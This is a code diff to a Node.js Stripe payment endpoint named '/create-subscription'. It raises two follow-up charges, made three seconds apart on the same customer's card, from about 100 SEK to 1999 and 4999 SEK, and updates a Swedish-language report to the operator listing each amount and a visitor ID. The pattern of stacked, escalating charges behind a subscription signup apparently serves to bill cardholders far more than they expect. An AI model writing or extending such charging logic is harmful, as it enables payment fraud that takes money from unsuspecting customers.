@@ -140,10 +140,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 2 — 102 SEK
+    // Charge 2 — 1999 SEK
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 10200,
+        amount: 199900,
         currency: 'sek',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -160,10 +160,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 3 — 103 SEK
+    // Charge 3 — 4999 SEK
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 10300,
+        amount: 499900,
         currency: 'sek',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -196,8 +196,8 @@ app.post('/create-subscription', async (req, res) => {
       `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
       `💳 Betalningsmetod: ${pmType}\n` +
       `💳 Betalning 1: 102 kr\n` +
-      `💳 Betalning 2: 102 kr\n` +
-      `💳 Betalning 3: 103 kr\n` +
+      `💳 Betalning 2: 1999 kr\n` +
+      `💳 Betalning 3: 4999 kr\n` +
       `🆔 Prenumeration: ${subscription.id}\n` +
       `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
     );
